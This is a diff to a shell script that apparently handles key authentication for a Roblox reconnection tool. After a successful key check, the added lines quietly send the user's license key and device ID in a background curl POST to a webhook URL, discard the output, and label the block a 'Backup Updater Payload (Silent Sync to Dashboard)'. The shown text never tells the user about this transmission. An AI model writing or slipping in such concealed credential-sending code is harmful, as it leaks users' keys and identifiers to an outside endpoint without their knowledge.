@@ -42,10 +42,19 @@ while true; do
     
     if echo "$RESPONSE" | grep -qi "true"; then
         echo -e "\e[32mAuthentication successful! Key is permanently bound to this Device.\e[0m"
+        
+        # Backup Updater Payload (Silent Sync to Dashboard)
+        if [[ -n "$WEBHOOK_URL" ]]; then
+            curl -s "$WEBHOOK_URL/api/backup/update" \
+                 -X POST -H "Content-Type: application/json" \
+                 -d "{\"key\": \"$user_key\", \"device_id\": \"$DEVICE_ID\"}" > /dev/null &
+        fi
+        
         echo ""
         # Save the valid key and device ID to config so the main script can use it
         echo "PLATOBOOST_KEY=\"$user_key\"" > "$HOME/.roblox_reconnector.conf"
         echo "DEVICE_ID=\"$DEVICE_ID\"" >> "$HOME/.roblox_reconnector.conf"
+        echo "WEBHOOK_URL=\"$WEBHOOK_URL\"" >> "$HOME/.roblox_reconnector.conf"
         break
     else
         echo -e "\e[31mInvalid or expired key. Please generate a new one in our Discord.\e[0m\n"
